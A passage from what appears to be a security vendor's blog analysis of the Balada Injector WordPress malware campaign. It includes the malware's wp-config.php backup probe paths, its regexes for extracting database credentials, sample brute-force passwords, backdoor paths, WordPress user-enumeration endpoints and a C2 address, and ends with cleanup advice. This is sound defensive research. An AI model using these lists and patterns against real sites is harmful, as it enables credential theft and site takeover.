<span class="line_wrapper">/wp-config.php.save</span>
<span class="line_wrapper">/wp-config.php.save.1</span>
<span class="line_wrapper">/wp-config.php.swo</span>
<span class="line_wrapper">/wp-config.php.swp</span>
<span class="line_wrapper">/wp-config.php1</span>
<span class="line_wrapper">/wp-config.php?aam-media=1</span>
<span class="line_wrapper">/wp-config.php?aam-media=2</span>
<span class="line_wrapper">/wp-config.php_bak298023223876953125</span>
<span class="line_wrapper">/wp-config.php_bak/wp-config.php-bak</span>
<span class="line_wrapper">/wp-config.save</span>
<span class="line_wrapper">/wp-config.swp</span>
<span class="line_wrapper">/wp-config.tar</span>
<span class="line_wrapper">/wp-config.txt</span>
<span class="line_wrapper">/wp-config.xml</span>
<span class="line_wrapper">/wp-config.zip</span></span>
<span class="line_wrapper">…</span></pre>
<p>The binary also contained regular expression rules to extract database credentials from <b>wp-config.php</b></p>
<pre class="code_syntax" style="color: #d1d1d1; background: #000000;"><span class="line_wrapper"><span style="color: #33cccc;">DB_HOST</span><span style="color: #00a800;">.</span>*?,.*?['|"](.*?)['|"]</span>
<span class="line_wrapper"><span style="color: #33cccc;">DB_NAME</span><span style="color: #00a800;">.</span>*?,.*?['|"](.*?)['|"]</span>
<span class="line_wrapper"><span style="color: #33cccc;">DB_PASS</span><span style="color: #00a800;">.</span>*?,.*?['|"](.*?)['|"]DB_USER<span style="color: #00a800;">.</span>*?,.*?['|"](.*?)['|"]</span></pre>
<p>These are the same regular expressions used in the PHP scripts that they upload to compromised sites to inject malware and discover other websites which share the same server account, facilitating cross-site contamination and easy infection opportunities.</p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-31062" src="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_database_credentials.png" alt="Database credentials targeted by Balada Injector" width="612" height="157" srcset="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_database_credentials.png 612w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_database_credentials-600x154.png 600w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_database_credentials-560x144.png 560w" sizes="(max-width: 612px) 100vw, 612px" /></p>
<p>&nbsp;</p>
<h2 id="archives-database-dumps">Archives and database dumps</h2>
<p>In addition to backup files of just <b>wp-config.php</b>, attackers also check for whole site backups and database backups.</p>
<p>Specifically, their Balada Injector client has functions like <b>main.listzips</b> and <b>main.listmysqls</b>. The first one looks for <b>23</b> common archive names like <b>archive</b>, <b>changed</b>, <b>public_html</b>, <b>rt18_archive</b>, <b>old</b>, etc adding these 5 extensions to them: <b>.zip</b>, <b>.gz</b>, <b>.tar.gz</b>, <b>.rar</b> and <b>.gzip. </b><b>Listmysqls</b> checks for <b>14</b> common names of SQL export files. Here’s an example of what that <a href="https://lifeinhex.com/stealing-wordpress-credentials/">looked like back in 2020</a> in real website attacks.</p>
<p>In order to enhance the utilization of these website archives, the Balada Injector client incorporates a feature designed to interact with them: <b>main.dwn_zip_unzip(string domain)</b>. This particular function is responsible for downloading the located archive file, extracting its contents, and subsequently examining the data for any valuable information. For instance, it employs regular expressions to retrieve database and <a href="https://developer.wordpress.org/apis/wp-config-php/#wordpress-upgrade-constants">FTP</a> credentials from wp-config.php files. Furthermore, the attackers also leverage the client to seek values of <b>WP_SITEURL</b> and <b>WP_HOME</b>, provided they are configured within the <b>wp-config.php</b> file.</p>
<p>&nbsp;</p>
<h2 id="logs">Miscellaneous logs and scripts</h2>
<p>In addition to backups, Balada Injector diligently searches for various files that could contain any sensitive or potentially useful information, such as access log files, error logs, files with debug information, or database administration tools such as adminer and phpmyadmin. The <b>main.lisk_lk</b> function with 37 predefined paths takes charge of this task.</p>
<h3 style="padding-top: 15px;">Database Tools</h3>
<p>You might be wondering why Balada Injector seeks out general-use tools like Adminer. The reason is that these tools are sometimes left behind by site administrators or developers after completing maintenance tasks. It&#8217;s not rare for these tools to be improperly protected or to contain vulnerabilities.</p>
<h4 style="padding-top: 10px;">searchreplacedb2.php</h4>
<p>For instance, in 2017, Balada Injector exploited a database <a href="https://blog.sucuri.net/2017/09/old-themes-abandoned-scripts-pitfalls-cleaning-serialized-data.html">Search and Replace tool that caused widespread infections</a>. It looked for &#8220;<b>searchreplacedb2.php</b>&#8221; files and leveraged them to inject malicious scripts into WordPress posts. The issue with this tool was that, in an attempt to simplify life for WordPress administrators, it automatically logged into the WordPress database using the credentials from wp-config.php. As a result, anyone who opens the <b>searchreplacedb2.php </b>script in a browser could modify the WordPress database without any authentication.</p>
<h4 style="padding-top: 10px;">Adminer</h4>
<p>The Adminer script requires database user authentication, but doesn’t differentiate between connecting to a site’s local database or to some remote database. It turns out that some versions have a bug that allows hackers to connect to a third-party MySQL database under their control, and subsequently, utilize Adminer to query the contents of local files on the server hosting the Adminer script. This <a href="https://blog.sucuri.net/2019/11/vulnerable-versions-of-adminer-as-a-universal-infection-vector.html">bug was exploited by Balada Injector</a> to extract database credentials from <b>wp-config.php</b> and use them to inject malware into the WordPress database and generate fake WordPress admin users.</p>
<p>&nbsp;</p>
<h2 id="data-collection">Assorted data collection</h2>
<p>It’s important to note that the predefined lists we examined earlier experienced frequent alterations in almost every iteration of the Balada Injector, as malware authors continually added new elements and removed underperforming ones.</p>
<p>In a later version of the binary (probably late 2020 or early 2021) we uncovered a consolidated list of files with sensitive and potentially exploitable information, including:</p>
<ul>
<li aria-level="1">variations of <b>wp-config.php</b> backup file names</li>
<li aria-level="1">different exploits that enable reading <b>wp-config.php</b></li>
<li aria-level="1">variations of site archives filenames</li>
<li aria-level="1">variations of database backup filenames</li>
</ul>
<p>In this updated version, the attack operators also added an extensive list server shell related items (e.g. .passwd, .bash_history) and development environment components (e.g. make files, ignore files for Docker, Git, configuration files for linters, Travis CI, PHP_CodeSniffer, files created by masOS such as .DS_Store and .FBCIndex, etc.) As you can see, they take this very seriously. Altogether, this new list contained <b>318</b> distinct new entries.</p>
<p>&nbsp;</p>
<h2 id="brute-force">Brute force WordPress admins</h2>
<p>Naturally, if cybercriminals pay attention to such uncommon attack vectors as exploiting information from inadvertently exposed linter ignore files, one cannot assume they would overlook the more easily attainable targets like guessing WordPress admin passwords.</p>
<p>Indeed, Balada Injector binaries possess a function called <b>main.passes, which in the version we examined, contains 74 predefined passwords</b>. It’s far from being exhaustive but includes all obvious variants such as <b>admin</b>, <b>123456</b>, <b>password</b>, <b>qwerty</b>, <b>letmein123</b>, <b>loveyou</b>. It also contains quite a few fairly unobvious variants such as <b>7h3$3cr373n5173p@ss</b> (“the secreten site pass” in leetspeak), <b>96pitney89arcanawilkes</b>, <b>TJoH8YgAYMdrTOMT</b>, <b>Winner!@0505</b>, and <b>votre_mdp_de_bdd</b>.</p>
<p>Now, one might argue that simply guessing a password is fruitless without knowing the corresponding username. True, and hackers are well aware of this fact. They also know how to get a list of users directly from WordPress. This doesn’t even involve any sort of vulnerabilities — they simply use <a href="https://developer.wordpress.org/rest-api/reference/users/#list-users">WordPress own APIs</a> such as /<b>wp-json/wp/v2/posts</b>, /<b>wp-json/wp/v2/users</b>, /<b>wp-json/buddypress/v1/members</b> and then parse the output. It&#8217;s worth noting that WordPress, by default, currently displays only users with published posts. This serves as yet another reason to employ separate WordPress accounts with distinct roles for administrative and publishing tasks.</p>
<p>&nbsp;</p>
<h2 id="backdoors">Backdoors</h2>
<p>Of course, Balada Injector is known for uploading and leaving multiple backdoors throughout the compromised environment. The main point of a backdoor is to maintain access to the site well past the initial infection, subsequent cleanups, and any plugin or theme updates. This means that from wave to wave, attackers need to change filenames and locations of their backdoors to prevent easy discovery.</p>
<p>With so many waves and the backdoor locations, it must not be a trivial task to maintain and use a full up-to-date list of them.</p>
<p>Well, the Balada Injector client at least tries. It had a function called <b>main.dop_sh_paths.</b> If you translate “dop” from Russian as “additional”, then the function name can be described as “additional shell paths”. The 2020 version of this function contained <b>176</b> predefined backdoor paths.</p>
<p>Here’s a short excerpt from the list:</p>
<pre class="code_syntax" style="color: #d1d1d1; background: #000000;"><span class="line_wrapper">...</span>
<span style="color: #99cc00;"><span class="line_wrapper">/wp-bk-report.php</span>
<span class="line_wrapper">/wp-content/plugins/crelly-slider/wordpress/temp/super-socialat/super_socialat.php</span>
<span class="line_wrapper">/wp-content/plugins/formcraft/file-upload/server/php/files/wp-upd.php</span>
<span class="line_wrapper">/wp-content/plugins/wp-hello-plugin/wp-hello-plugin.php</span>
<span class="line_wrapper">/wp-content/s.php</span>
<span class="line_wrapper">/wp-content/uploads/2018/09/wp-pr.php</span>
<span class="line_wrapper">/wp-content/uploads/2018/11/wp-upd.php</span>
<span class="line_wrapper">/wp-content/uploads/2018/2018.php</span>
<span class="line_wrapper">/wp-content/uploads/2019/01/wp-upd.php</span>
<span class="line_wrapper">/wp-content/uploads/2019/02/wp-upd.php</span>
<span class="line_wrapper">/wp-content/uploads/2019/03/wp-simple-plugin.php</span>
<span class="line_wrapper">/wp-content/uploads/2019/11/wp-simple-plugin.php</span>
<span class="line_wrapper">/wp-content/uploads/2019/12/wp-simple-plugin.php</span>
<span class="line_wrapper">/wp-content/uploads/2020/01/wp-block-plugin.php</span>
<span class="line_wrapper">/wp-content/uploads/2020/01/wp-zip-plugin.php</span>
<span class="line_wrapper">/wp-content/uploads/2020/02/wp-block-plugin-1.php</span>
<span class="line_wrapper">/wp-content/uploads/2020/02/wp-simple-plugin.php</span>
<span class="line_wrapper">/wp-content/uploads/2020/03/wp-block-plugin-2.php</span>
<span class="line_wrapper">/wp-content/uploads/2020/03/wp-zip-plugin-2.php</span>
<span class="line_wrapper">/wp-content/uploads/2020/04/wp-hello-plugin.php</span>
<span class="line_wrapper">/wp-content/uploads/2020/04/wp-zip-plugin.php</span>
<span class="line_wrapper">/wp-content/uploads/fm_temp.php</span>
<span class="line_wrapper">/wp-content/uploads/header-template.php</span>
<span class="line_wrapper">/wp-content/uploads/ld.php</span>
<span class="line_wrapper">/wp-content/uploads/up.php</span>
<span class="line_wrapper">/wp-content/uploads/wp-craft-report.php</span>
<span class="line_wrapper">/wp-content/uploads/wp-crawl.php</span>
<span class="line_wrapper">/wp-content/uploads/wp-header-template.php</span>
<span class="line_wrapper">/wp-content/uploads/wp-logs.php</span>
<span class="line_wrapper">/wp-content/uploads/wp-upds.php</span>
<span class="line_wrapper">/wp-doc.php</span>
<span class="line_wrapper">/wp-tmp5.php</span>
<span class="line_wrapper">/wp-up.php</span>
<span class="line_wrapper">/wp-upd.php</span>
<span class="line_wrapper">/wpdemos.php</span></span>
<span class="line_wrapper">...</span></pre>
<p>&nbsp;</p>
<h2 id="cross-site-infections">Cross-site infections</h2>
<p>When Balada Injector gains access to a compromised website’s file system, it typically uploads a backdoor with “infector” functionality. In addition to executing arbitrary PHP code, the main functionality of such files is to infect existing .php, .<b>htm</b>l and .<b>js</b> files in the environment — so naturally, the malware searches for eligible files on the server. However, it doesn&#8217;t initiate the search from the current location. Instead, it tries to start the search as high in the directory structure hierarchy as possible. In some versions, the search starts <a href="https://blog.sucuri.net/2018/10/multiple-ways-to-inject-the-same-tech-support-scam-malware.html"> from the server root</a>, and in other cases they use multiple &#8220;<b>../</b>&#8221; to navigate up several levels in a directory hierarchy. Each &#8220;<b>../</b>&#8221; means to move up one directory level, so on the screenshot below you can see that they start their search 8 directory levels up from the current script.</p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-31063" src="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_cross-site-infection.png" alt="Cross site infections with Balada Injector" width="747" height="39" srcset="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_cross-site-infection.png 747w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_cross-site-infection-600x31.png 600w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_cross-site-infection-650x34.png 650w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_cross-site-infection-745x39.png 745w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_cross-site-infection-560x29.png 560w" sizes="(max-width: 747px) 100vw, 747px" /></p>
<p>The point of this broad search is to find writable directories that belong to other sites. Most commonly, these sites belong to the webmaster of the compromised site and they all share the same server account and the same file permissions. In this manner, compromising just one site can potentially grant access to several other sites &#8220;for free.&#8221;</p>
<p>&nbsp;</p>
<h2 id="client-hosts-C2-servers">Balada Injector Client hosts and C2 Server</h2>
<p>You can’t expect to find the Balada Injector Client on every compromised site. Managing thousands of clients and updating them for every new wave of the campaign would be quite challenging. Instead, we believe, clients are uploaded to only a small fraction of hacked sites, likely those hosted on a private or virtual private server that shows signs of not being properly managed or neglected.</p>
<p>Such servers make ideal candidates for Balada clients for several reasons:</p>
<ul>
<li aria-level="1">They can run binary software.</li>
<li aria-level="1">There are usually more resources available compared to a typical site in a shared hosting environment.</li>
<li aria-level="1">Since the site/server is neglected, there are little chances that the malware will be quickly discovered.</li>
<li aria-level="1">Hosting providers typically don’t have access to private and virtual private servers and can’t scan them for malware. And as we know the Balada binaries are <a href="https://www.virustotal.com/gui/collection/b6a9a5788171c4fdfaf318c5d1462c98ab77f47624d47ecde6b4c8c7fdb47c68">well detected by multiple security vendors</a>.</li>
</ul>
<p>While it&#8217;s possible that the campaign operators rent their own servers, it&#8217;s rather unlikely that they submitted so many Balada binaries to VirusTotal themselves.</p>
<p>Based on our observations from 2019-2020 (and may still work similarly, although we don’t see fresh samples of Balada Injector binaries on VirusTotal), the process seems to involve a relatively small number of hosts with Balada Clients scanning a list of websites for known vulnerabilities and sensitive information. Upon finding actionable results, the client attempts to infect the website. Successful infections or retrieved sensitive information are then reported to a command-and-control (C2) server.</p>
<p>In the case of the binary client that we and Dr.Web analyzed, the C2 server was <a href="https://www.virustotal.com/gui/ip-address/45.9.148.48/relations">45.9.148 .48</a> on port 8349. This very server is also known to host phishing sites.</p>
<h3 style="padding-top: 15px;">User agents and connection to NDSX/NDSW</h3>
<p>We have discovered a few hardcoded user agents in 2020 versions of Balada Injector binary clients:</p>
<ul>
<li aria-level="1">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.59 Safari/537.36</li>
<li aria-level="1">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0</li>
<li aria-level="1">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36</li>
<li aria-level="1">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</li>
</ul>
<p>The last user agent “<b>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</b>” is still regularly found by our teams in attack logs (for the record, Chrome 84.0.4147.125 was released in August of 2020.).</p>
<p>Interestingly enough, this user agent is also known to be used by the <a href="https://blog.sucuri.net/2022/06/analysis-massive-ndsw-ndsx-malware-campaign.html">NDSW/NDSX campaign</a>. We are not making strong connections between the two campaigns yet because it is still common to see either one type of infection or another, but lately we’ve begun noticing fake plugins (most common names <b>wp-clearlineee</b> and <b>wp-resortpack</b>) that at the same time contain Balada injections and NDSX part of the NDSW/NDSX malware.</p>
<figure id="attachment_31064" aria-describedby="caption-attachment-31064" style="width: 933px" class="wp-caption aligncenter"><a href="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_user_agents_ndsx_ndsw.png"><img decoding="async" loading="lazy" class="wp-image-31064 size-full" src="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_user_agents_ndsx_ndsw.png" alt=" fake plugins (most common names wp-clearlineee and wp-resortpack) that at the same time contain Balada injections and NDSX part of the NDSW/NDSX malware." width="933" height="830" srcset="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_user_agents_ndsx_ndsw.png 933w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_user_agents_ndsx_ndsw-600x534.png 600w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_user_agents_ndsx_ndsw-650x578.png 650w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_user_agents_ndsx_ndsw-768x683.png 768w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_user_agents_ndsx_ndsw-560x498.png 560w" sizes="(max-width: 933px) 100vw, 933px" /></a><figcaption id="caption-attachment-31064" class="wp-caption-text">Balada and NDSW/NDSX malware injected by the same fake plugin</figcaption></figure>
<p>&nbsp;</p>
<h2>How to clean up and protect your site from Balada Injector</h2>
<p>Now that you understand the various methods and approaches that Balada Injector leverages to infect websites you might realize we can’t easily tell people on Twitter how exactly their sites got infected/reinfected with Balada malware. There are so many infection vectors and scenarios and most of them cannot be verified without full access to the server and server logs. Our best option is to direct individuals to general <a href="https://sucuri.net/guides/how-to-clean-hacked-wordpress/">WordPress malware cleanup guides</a>, which encompass the majority of these situations.</p>
<p>So, let’s take a look how Balada Injector can infect a website and what you can do to protect against such vectors:</p>
<ul>
<li aria-level="1"><b>Exploiting plugin and theme vulnerabilities</b>: keep all of your website software up-to-date, remove unused plugins and themes, and utilize <a href="https://sucuri.net/website-firewall/">a web application firewall</a></li>
<li aria-level="1"><b>Brute-force WordPress admin credentials</b>: Use <a href="https://blog.sucuri.net/2022/08/how-to-create-secure-passwords-for-your-website.html">strong, unique passwords</a> for all your accounts, 2FA, avoid granting admin privileges for users who don’t need it, and leverage a WAF. Always change your WordPress admin passwords after compromise.</li>
<li aria-level="1"><b>Database credentials stolen from wp-config.php</b>: Keep all themes/plugins updated, avoid renaming wp-config.php files with valid credentials for testing purposes, and if needed, store copies outside of public directories or locally, preferably encrypted. Change database passwords after detecting a compromise.</li>
<li aria-level="1"><b>Backdoors</b>: Thoroughly clean JavaScript and PHP malware, and eliminate any remaining Balada Injector backdoors. Implement <a href="https://blog.sucuri.net/2021/05/server-side-scans-and-file-integrity-monitoring.html">file integrity</a> control systems and use professional <a href="https://sucuri.net/website-malware-removal/">website cleanup services</a> to make sure you didn’t miss anything..</li>
<li aria-level="1"><b>FTP</b>: Be cautious of the Balada Injector&#8217;s ability to steal FTP credentials from wp-config.php and other configuration files. Keep local development environment files separate from server files and monitor FTP logs. Change FTP passwords after a compromise.</li>
<li aria-level="1"><b>Malicious WordPress admins</b>: Balada Injector is known for creating malicious admin users. Make sure to monitor admin users. To make it easier, don’t let everyone who works with the site have administrator permissions. In most cases all they need is a less privileged role.</li>
<li aria-level="1"><b>Cross-site infections</b>: Inspect, clean, and protect all sites hosted under the same server account. For important sites, isolate them with separate server accounts to prevent malware propagation from neighbor sites.</li>
<li aria-level="1"><b>Third-party tools:</b> Legitimate tools (e.g. Adminer, file managers, &#8220;search and replace&#8221;, tools) can be exploited by hackers if unprotected and left in publicly accessible locations. Stay vigilant and protect these tools and remove them from your server as soon as you finish using them..</li>
<li aria-level="1"><b>Files with sensitive information</b>: Secure files like wp-config.php, site backups, database dumps, and local development environment files. If using Git or Subversion, disable public access to system directories and files (e.g. .git/, .gitignore, etc.). Configure your upload client to exclude local configuration files and debug files. Remove debug files as soon as possible and <a href="https://blog.sucuri.net/2022/10/how-to-securely-debug-wordpress-errors-on-your-website.html">avoid dumping sensitive information in debug logs</a>.</li>
</ul>
<p>Webmasters can refer to our<a href="https://sucuri.net/guides/website-security/"> website security guide</a> on best practices to harden and protect a website against infection. But as always, if you believe your site has been infected with Balada Injector or some other malware, we’re always happy to <a href="https://sucuri.net/website-security-platform/">help with malware cleanup</a>.</p>
<aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2023%2F04%2Fbalada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Balada%20Injector%3A%20Synopsis%20of%20a%20Massive%20Ongoing%20WordPress%20Malware%20Campaign&amp;url=https://blog.sucuri.net/2023/04/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html&amp;via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none"></div></div>
            </div>
                <div style="clear:both"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.8--></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Categories: <a href="https://blog.sucuri.net/category/website-malware-infections" rel="category tag">Website Malware Infections</a>, <a href="https://blog.sucuri.net/category/website-security" rel="category tag">Website Security</a>, <a href="https://blog.sucuri.net/category/wordpress-security" rel="category tag">WordPress Security</a></span><span class="entry-tags">Tags: <a href="https://blog.sucuri.net/tag/balada-injector" rel="tag">Balada Injector</a>, <a href="https://blog.sucuri.net/tag/black-hat-tactics" rel="tag">Black Hat Tactics</a>, <a href="https://blog.sucuri.net/tag/hacked-websites" rel="tag">Hacked Websites</a>, <a href="https://blog.sucuri.net/tag/malware" rel="tag">Malware</a>, <a href="https://blog.sucuri.net/tag/obfuscation" rel="tag">Obfuscation</a>, <a href="https://blog.sucuri.net/tag/redirects-2" rel="tag">Redirects</a>, <a href="https://blog.sucuri.net/tag/wordpress-plugins-and-themes" rel="tag">WordPress Plugins and Themes</a></span></p></footer></article><section class="author-box"><img alt='' src='https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=115&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=230&#038;d=mm&#038;r=g 2x' class='avatar avatar-115 photo' height='115' width='115' loading='lazy' decoding='async'/><h4 class="author-box-title">About <span itemprop="name">Denis Sinegubko</span></h4><div class="author-box-content" itemprop="description"><p>Denis Sinegubko is Sucuri’s Senior Malware Researcher who joined the company in 2013. Denis' main responsibilities include researching emerging threats and creating  signatures for SiteCheck. The founder of UnmaskParasites, his professional experience covers over 20 years of programming and information security. When Denis isn’t analyzing malware, you might not find him online at all. Connect with him on <a href="https://twitter.com/unmaskparasites">Twitter</a>.</p>
</div></section><h2 class="screen-reader-text">Reader Interactions</h2></main><aside class="sidebar sidebar-primary widget-area" role="complementary" aria-label="Primary Sidebar" itemscope itemtype="https://schema.org/WPSideBar" id="genesis-sidebar-primary"><h2 class="genesis-sidebar-title screen-reader-text">Primary Sidebar</h2><div class="sidebar-primary-wrap"><section id="text-5" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Socialize With Sucuri</h3>
			<div class="textwidget"><p>We're actively engaged across multiple platforms. Follow us and let's connect!</p>
<ul class="social-icons">
<li><a target="_blank" href="https://www.facebook.com/SucuriSecurity" rel="noopener"><span class="screen-reader-text">Facebook</span></a></li>
<li><a target="_blank" href="https://twitter.com/sucurisecurity" rel="noopener"><span class="screen-reader-text">Twitter</span></a></li>
<li><a target="_blank" href="https://www.linkedin.com/company/sucuri-security" rel="noopener"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a target="_blank" href="https://www.youtube.com/c/sucurinet" rel="noopener"><span class="screen-reader-text">YouTube</span></a></li>
<li><a target="_blank" href="https://www.instagram.com/sucurisecurity/" rel="noopener"><span class="screen-reader-text">Instagram</span></a></li>
<li><a target="_blank" href="https://blog.sucuri.net/feed/" rel="noopener"><span class="screen-reader-text">RSS Feed</span></a></li>
</ul>
</div>
		</div></section>
<section id="search-3" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://blog.sucuri.net/"><label class="search-form-label screen-reader-text" for="searchform-6444225f6d9f8">Search the blog</label><input type="search" name="s" id="searchform-6444225f6d9f8" placeholder="Search the blog" /><input type="submit" value="Search" /></form></div></section>
<section id="text-43" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
<section id="text-37" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
</div><div class="sidebar-cta-widget" id="sidebar-cta"><section id="text-6" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Join Over 20,000 Subscribers!</h3>
			<div class="textwidget"><p><a href="http://sucuri.hs-sites.com/subscribe-to-security" onClick="ga('send', 'event', 'Blog', 'Button_Click', 'Subscribe_to_Security_Newsletter');"><img decoding="async" src="https://blog.sucuri.net/wp-content/uploads/2017/09/17-EN-sucuri-blog-newsletter-banner.png" /></a></p>
</div>
		</div></section>
<section id="block-3" class="widget widget_block widget_media_image"><div class="widget-wrap"><div class="wp-block-image is-style-default">
<figure class="aligncenter size-full"><a onclick="ga('send', 'event', 'Blog', 'Button_Click', 'Get_Help_Now');" href="https://sucuri.net/website-security-platform/signup/" target="_blank" rel=" noreferrer noopener"><img decoding="async" loading="lazy" width="1401" height="1361" src="https://blog.sucuri.net/wp-content/uploads/2023/01/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-1.png" alt="Sucuri Sidebar Malware Removal to Signup Page" class="wp-image-30713" srcset="https://blog.sucuri.net/wp-content/uploads/2023/01/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-1.png 1401w, https://blog.sucuri.net/wp-content/uploads/2023/01/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-1-600x583.png 600w, https://blog.sucuri.net/wp-content/uploads/2023/01/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-1-650x631.png 650w, https://blog.sucuri.net/wp-content/uploads/2023/01/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-1-768x746.png 768w, https://blog.sucuri.net/wp-content/uploads/2023/01/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-1-560x544.png 560w" sizes="(max-width: 1401px) 100vw, 1401px" /></a></figure></div></div></section>
</div></aside></div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Products</h3>
<div class="menu-footer-products-menu-container"><ul id="menu-footer-products-menu" class="menu"><li id="menu-item-15501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15501"><a href="https://sucuri.net/website-firewall/" itemprop="url">Website Firewall</a></li>
<li id="menu-item-15502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15502"><a href="https://sucuri.net/website-antivirus/" itemprop="url">Website AntiVirus</a></li>
<li id="menu-item-15503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15503"><a href="https://sucuri.net/website-backups/" itemprop="url">Website Backups</a></li>
<li id="menu-item-15504" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15504"><a href="https://sucuri.net/wordpress-security/" itemprop="url">WordPress Security</a></li>
<li id="menu-item-15505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15505"><a href="https://sucuri.net/custom/enterprise/" itemprop="url">Enterprise Services</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-2 footer-widget-area"><section id="nav_menu-4" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Solutions</h3>
<div class="menu-footer-solutions-menu-container"><ul id="menu-footer-solutions-menu" class="menu"><li id="menu-item-15506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15506"><a href="https://sucuri.net/website-firewall/ddos-protection" itemprop="url">DDos Protection</a></li>
<li id="menu-item-15507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15507"><a href="https://sucuri.net/website-antivirus/malware-scanning-and-detection" itemprop="url">Malware Detection</a></li>
<li id="menu-item-15508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15508"><a href="https://sucuri.net/website-antivirus/malware-removal" itemprop="url">Malware Removal</a></li>
<li id="menu-item-15510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15510"><a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" itemprop="url">Malware Prevention</a></li>
<li id="menu-item-15511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15511"><a href="https://sucuri.net/website-antivirus/blacklist-removal-and-repair" itemprop="url">Blacklist Removal</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-3 footer-widget-area"><section id="nav_menu-6" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Support</h3>
<div class="menu-footer-support-menu-container"><ul id="menu-footer-support-menu" class="menu"><li id="menu-item-15512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15512"><a href="https://blog.sucuri.net/" itemprop="url">Blog</a></li>
<li id="menu-item-15513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15513"><a href="https://kb.sucuri.net/" itemprop="url">Knowledge Base</a></li>
<li id="menu-item-15515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15515"><a href="https://sitecheck.sucuri.net/" itemprop="url">SiteCheck</a></li>
<li id="menu-item-15516" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15516"><a href="http://labs.sucuri.net/" itemprop="url">Research Labs</a></li>
<li id="menu-item-15517" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15517"><a href="https://sucuri.net/faq/" itemprop="url">FAQ</a></li>
</ul></div></div></section>
